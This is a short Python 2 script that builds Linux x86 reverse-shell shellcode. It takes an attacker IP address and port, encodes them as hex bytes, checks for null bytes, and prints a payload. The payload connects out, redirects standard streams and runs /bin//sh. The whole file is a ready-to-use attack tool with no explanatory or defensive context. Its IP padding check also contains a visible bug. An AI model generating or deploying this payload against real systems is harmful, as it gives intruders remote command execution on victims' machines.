import sys

def portconversion(port):
	port = hex(int(port))[2:]
	sizep = len(port)
	if sizep == 1 or sizep == 3:
		port = "0" + port #Padding 0

	if sizep == 2:
	        port = '\\x'+str(port[0:2])
	else:
        	port = '\\x'+str(port[0:2]) + '\\x'+str(port[2:4])

	if "\\x00" in port:
		print "[!] With this port the shellcode would have a null byte!"
		print "\tPort bytes:", port
		sys.exit()

	return port

def ipconversion(ip):
	octets = ip.split(".")

	ret = ""
	for o in octets:
		i = hex(int(o))[2:]
		if len(o) == 1:
	                i = "0" + i
		ret = ret + "\\x" + i

        if "\\x00" in ret:
                print "[!] With this IP the shellcode would have a null byte!"
                print "\tIP bytes:", ret
                sys.exit()


	return ret

def main():
	argnum = len(sys.argv)
	if argnum != 3:
		print "Usage: ./"+sys.argv[0]+" <IP ADDRESS> <PORT>"
	else:
		port = int(sys.argv[2])
		if port < 1 or port > 65535:
			print "Invalid Port!  [ 1-65535 ]"
			exit()

		ip = ipconversion(sys.argv[1])
		port = portconversion(sys.argv[2])


		shellcode = "\""
		shellcode += "\\x31\\xc0\\xb0\\x66\\x31\\xdb\\x43\\x31\\xf6\\x56\\x53\\x6a"
		shellcode += "\\x02\\x89\\xe1\\xcd\\x80\\x97\\x31\\xc0\\xb0\\x66\\x43\\x68"
		shellcode += ip
		shellcode += "\\x66\\x68"
		shellcode += port
		shellcode += "\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\x43\\xcd"
		shellcode += "\\x80\\x31\\xc9\\xb1\\x02\\x89\\xfb\\xb0\\x3f\\xcd\\x80\\x49"
		shellcode += "\\x79\\xf9\\xb0\\x0b\\x56\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f"
		shellcode += "\\x62\\x69\\x6e\\x89\\xe3\\x56\\x53\\x89\\xe1\\x89\\xf2\\xcd"
		shellcode += "\\x80"
		shellcode += "\""

		print shellcode

if __name__ == "__main__":
    main()
